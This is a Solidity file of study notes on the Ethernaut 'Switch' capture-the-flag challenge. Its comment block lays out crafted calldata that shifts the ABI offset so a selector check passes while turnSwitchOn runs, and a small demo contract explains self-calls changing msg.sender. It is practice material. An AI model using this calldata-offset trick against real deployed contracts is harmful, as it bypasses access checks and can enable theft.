// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
/*
Question 1   : Solution of Swith challenge



Question 2  In Switch challenge , How   modifier onlyThis() 
                                        {
                                            require(msg.sender == address(this), "Only the contract can call this"); _;
                                        }  
                                        ????????????????????????????????????????????????????????????????????????????????????????????????


        *******************************************************************************
        *    How msg.sender will automatically change to the address of the Switch    *
        * *****************************************************************************





Answer 1

        final ans = 0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000

        flipSwitch  = 0x30c13ade
        turnSwitchOn = 0x76227e12


        0x  30c13ade                                                           (func signature)
            0000000000000000000000000000000000000000000000000000000000000060   (location)        6*16^1 + 0*16^0 = 96 bytes        32 bytes   
            0000000000000000000000000000000000000000000000000000000000000000                                                       32 bytes   
            20606e1500000000000000000000000000000000000000000000000000000000                                                       32 bytes   
            0000000000000000000000000000000000000000000000000000000000000004   size = 4 bytes                                      32 bytes
            76227e1200000000000000000000000000000000000000000000000000000000                                                       32 bytes   


                                        ↓
        0x  30c13ade
            0000000000000000000000000000000000000000000000000000000000000060         32 bytes                       
            0000000000000000000000000000000000000000000000000000000000000004         32 bytes                   
            20606e1500000000000000000000000000000000000000000000000000000000         32 bytes                    
            0000000000000000000000000000000000000000000000000000000000000004         32 bytes  
            76227e1200000000000000000000000000000000000000000000000000000000         32 bytes   

         

        60 (because 20606e is here only for modifier & due to 60 data starts after 96 bytes from start so value no matter what is hexavalue in between (after start berfore 96 bytes))     
        
        after (4 bytes + 32 bytes + 32 bytes  = 68)      ->  added 20606e15   
        Always Assume position/location like 68 in bytes  not in Hexadecimal wise 
                           
 */  



// Answer 2

contract Switch 
{
    address public  a;
    address public  b;
    function flipSwitch(bytes memory _data) public // step 2:  where msg.sender = EOA
    {
        (bool success, ) = address(this).call(_data);   // step 3 : address(this).call(_data) is executed, a recursive call occurs, essentially transferring control back to Switch
        require(success, "call failed :(");             //          msg.sender = address(this)
    }

    function turnSwitchOn() public  
    {
        a=msg.sender;
        b=address(this);
    }
    fallback() external  { }      // step 1 : 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
}
// a = b = contract address 



        
                                                                     
                      
                     